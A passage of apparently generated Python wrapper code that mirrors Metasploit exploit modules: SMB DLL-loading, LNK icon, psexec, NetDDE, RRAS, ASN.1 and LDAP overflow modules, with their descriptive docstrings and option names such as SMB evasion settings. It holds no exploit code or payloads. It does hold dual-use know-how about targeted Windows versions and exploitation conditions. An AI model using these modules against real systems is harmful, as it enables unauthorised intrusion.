        This is a general-purpose module for exploiting conditions where a DLL can be loaded
        from an specified SMB share. This module serves payloads as DLLs over an SMB service.
      
		"""

		path = 'windows/smb/generic_smb_dll_injection'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			SHARE = 'SHARE'
			FILE_NAME = 'FILE_NAME'
			FOLDER_NAME = 'FOLDER_NAME'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_smb_ms04_031_netdde(object):
		"""
		
          This module exploits a stack buffer overflow in the NetDDE service, which is the
        precursor to the DCOM interface.  This exploit effects only operating systems
        released prior to Windows XP SP1 (2000 SP4, XP SP0). Despite Microsoft's claim
        that this vulnerability can be exploited without authentication, the NDDEAPI
        pipe is only accessible after successful authentication.
      
		"""

		path = 'windows/smb/ms04_031_netdde'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_smb_group_policy_startup(object):
		"""
		
        This is a general-purpose module for exploiting systems with Windows Group Policy
        configured to load VBS startup/logon scripts from remote locations. This module runs
        a SMB shared resource that will provide a payload through a VBS file. Startup scripts
        will be executed with SYSTEM privileges, while logon scripts will be executed with the
        user privileges. Have into account which the attacker still needs to redirect the
        target traffic to the fake SMB share to exploit it successfully. Please note in some
        cases, it will take 5 to 10 minutes to receive a session.
      
		"""

		path = 'windows/smb/group_policy_startup'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			SHARE = 'SHARE'
			FILE_NAME = 'FILE_NAME'
			FOLDER_NAME = 'FOLDER_NAME'

	class windows_smb_ms06_025_rras(object):
		"""
		
          This module exploits a stack buffer overflow in the Windows Routing and Remote
        Access Service. Since the service is hosted inside svchost.exe, a failed
        exploit attempt can cause other system services to fail as well. A valid
        username and password is required to exploit this flaw on Windows 2000.
        When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.			
		"""

		path = 'windows/smb/ms06_025_rras'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_smb_ms15_020_shortcut_icon_dllloader(object):
		"""
		
        This module exploits a vulnerability in the MS10-046 patch to abuse (again) the handling
        of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious
        DLL. This creates an SMB resource to provide the payload and the trigger, and generates a
        LNK file which must be sent to the target. This module has been tested successfully on
        Windows 2003 SP2 with MS10-046 installed and Windows 2008 SP2 (32 bits) with MS14-027
        installed.
      
		"""

		path = 'windows/smb/ms15_020_shortcut_icon_dllloader'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_FILENAME = 'FILENAME'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			SHARE = 'SHARE'
			FOLDER_NAME = 'FOLDER_NAME'

	class windows_smb_ms10_046_shortcut_icon_dllloader(object):
		"""
		
          This module exploits a vulnerability in the handling of Windows
        Shortcut files (.LNK) that contain an icon resource pointing to a
        malicious DLL. This creates an SMB resource to provide the payload
        inside a DLL, and generates a LNK file which must be sent to the
        target.
      
		"""

		path = 'windows/smb/ms10_046_shortcut_icon_dllloader'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_FILENAME = 'FILENAME'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_SMBServerMaximumBuffer = 'SMBServerMaximumBuffer'
			required_SMBServerIdleTimeout = 'SMBServerIdleTimeout'
			SHARE = 'SHARE'
			FOLDER_NAME = 'FOLDER_NAME'

	class windows_smb_ms04_007_killbill(object):
		"""
		
          This is an exploit for a previously undisclosed
        vulnerability in the bit string decoding code in the
        Microsoft ASN.1 library. This vulnerability is not related
        to the bit string vulnerability described in eEye advisory
        AD20040210-2. Both vulnerabilities were fixed in the
        MS04-007 patch.

        You are only allowed one attempt with this vulnerability. If
        the payload fails to execute, the LSASS system service will
        crash and the target system will automatically reboot itself
        in 60 seconds. If the payload succeeeds, the system will no
        longer be able to process authentication requests, denying
        all attempts to login through SMB or at the console. A
        reboot is required to restore proper functioning of an
        exploited system.

        This exploit has been successfully tested with the win32/*/reverse_tcp
        payloads, however a few problems were encounted when using the
        equivalent bind payloads. Your mileage may vary.

      
		"""

		path = 'windows/smb/ms04_007_killbill'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_PROTO = 'PROTO'

	class windows_smb_psexec(object):
		"""
		
          This module uses a valid administrator username and password (or
        password hash) to execute an arbitrary payload. This module is similar
        to the "psexec" utility provided by SysInternals. This module is now able
        to clean up after itself. The service created by this tool uses a randomly
        chosen name and description.
      
		"""

		path = 'windows/smb/psexec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			SERVICE_NAME = 'SERVICE_NAME'
			SERVICE_DISPLAY_NAME = 'SERVICE_DISPLAY_NAME'
			SERVICE_DESCRIPTION = 'SERVICE_DESCRIPTION'
			required_SERVICE_PERSIST = 'SERVICE_PERSIST'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_SHARE = 'SHARE'
			required_ALLOW_GUEST = 'ALLOW_GUEST'
			SERVICE_FILENAME = 'SERVICE_FILENAME'
			PSH_PATH = 'PSH_PATH'
			SERVICE_STUB_ENCODER = 'SERVICE_STUB_ENCODER'

	class windows_smb_ms06_070_wkssvc(object):
		"""
		
          This module exploits a stack buffer overflow in the NetApi32 NetpManageIPCConnect
        function using the Workstation service in Windows 2000 SP4 and Windows XP SP2.

        In order to exploit this vulnerability, you must specify a the name of a
        valid Windows DOMAIN. It may be possible to satisfy this condition by using
        a custom dns and ldap setup, however that method is not covered here.

        Although Windows XP SP2 is vulnerable, Microsoft reports that Administrator
        credentials are required to reach the vulnerable code. Windows XP SP1 only
        requires valid user credentials. Also, testing shows that a machine already
        joined to a domain is not exploitable.
      
		"""

		path = 'windows/smb/ms06_070_wkssvc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			DynamicSehRecord = 'DynamicSehRecord'
			required_SMBPIPE = 'SMBPIPE'
			required_DOMAIN = 'DOMAIN'

	class windows_smb_timbuktu_plughntcommand_bof(object):
		"""
		
          This module exploits a stack based buffer overflow in Timbuktu Pro version <= 8.6.6
        in a pretty novel way.

        This exploit requires two connections. The first connection is used to leak stack data
        using the buffer overflow to overwrite the nNumberOfBytesToWrite argument. By supplying
        a large value for this argument it is possible to cause Timbuktu to reply to the initial
        request with leaked stack data. Using this data allows for reliable exploitation of the
        buffer overflow vulnerability.

        Props to Infamous41d for helping in finding this exploitation path.

        The second connection utilizes the data from the data leak to accurately exploit
        the stack based buffer overflow vulnerability.

        TODO:
        hdm suggested using meterpreter's migration capability and restarting the process
        for multishot exploitation.
      
		"""

		path = 'windows/smb/timbuktu_plughntcommand_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'

	class windows_smb_ms06_025_rasmans_reg(object):
		"""
		
          This module exploits a registry-based stack buffer overflow in the Windows Routing
        and Remote Access Service. Since the service is hosted inside svchost.exe,
        a failed exploit attempt can cause other system services to fail as well.
        A valid username and password is required to exploit this flaw on Windows 2000.
        When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.
        Exploiting this flaw involves two distinct steps - creating the registry key
        and then triggering an overwrite based on a read of this key. Once the key is
        created, it cannot be recreated. This means that for any given system, you
        only get one chance to exploit this flaw. Picking the wrong target will require
        a manual removal of the following registry key before you can try again:
        HKEY_USERS/.DEFAULT/Software/Microsoft/RAS Phonebook
      
		"""

		path = 'windows/smb/ms06_025_rasmans_reg'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_DCERPC_max_frag_size = 'DCERPC::max_frag_size'
			DCERPC_fake_bind_multi = 'DCERPC::fake_bind_multi'
			DCERPC_fake_bind_multi_prepend = 'DCERPC::fake_bind_multi_prepend'
			DCERPC_fake_bind_multi_append = 'DCERPC::fake_bind_multi_append'
			DCERPC_smb_pipeio = 'DCERPC::smb_pipeio'
			required_DCERPC_ReadTimeout = 'DCERPC::ReadTimeout'
			required_NTLM_UseNTLMv2 = 'NTLM::UseNTLMv2'
			required_NTLM_UseNTLM2_session = 'NTLM::UseNTLM2_session'
			required_NTLM_SendLM = 'NTLM::SendLM'
			required_NTLM_UseLMKey = 'NTLM::UseLMKey'
			required_NTLM_SendNTLM = 'NTLM::SendNTLM'
			required_NTLM_SendSPN = 'NTLM::SendSPN'
			required_SMB_pipe_evasion = 'SMB::pipe_evasion'
			required_SMB_pipe_write_min_size = 'SMB::pipe_write_min_size'
			required_SMB_pipe_write_max_size = 'SMB::pipe_write_max_size'
			required_SMB_pipe_read_min_size = 'SMB::pipe_read_min_size'
			required_SMB_pipe_read_max_size = 'SMB::pipe_read_max_size'
			required_SMB_pad_data_level = 'SMB::pad_data_level'
			required_SMB_pad_file_level = 'SMB::pad_file_level'
			required_SMB_obscure_trans_pipe_level = 'SMB::obscure_trans_pipe_level'
			SMBDirect = 'SMBDirect'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_SMBName = 'SMBName'
			required_SMB_VerifySignature = 'SMB::VerifySignature'
			required_SMB_ChunkSize = 'SMB::ChunkSize'
			required_SMB_Native_OS = 'SMB::Native_OS'
			required_SMB_Native_LM = 'SMB::Native_LM'
			required_SMBPIPE = 'SMBPIPE'

	class windows_ldap_imail_thc(object):
		"""
		
          This exploits a buffer overflow in the LDAP service that is
        part of the IMail product. This module was tested against
        version 7.10 and 8.5, both running on Windows 2000.
      
		"""

		path = 'windows/ldap/imail_thc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_ldap_pgp_keyserver7(object):
		"""
		
          This module exploits a stack buffer overflow in the LDAP service that is
          part of the NAI PGP Enterprise product suite. This module was tested
          against PGP KeyServer v7.0. Due to space restrictions, egghunter is
          used to find our payload - therefore you may wish to adjust WfsDelay.
      
		"""

		path = 'windows/ldap/pgp_keyserver7'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_local_virtual_box_opengl_escape(object):
		"""
		
        This module exploits a vulnerability in the 3D Acceleration support for VirtualBox. The
        vulnerability exists in the remote rendering of OpenGL-based 3D graphics. By sending a
        sequence of specially crafted rendering messages, a virtual machine can exploit an out
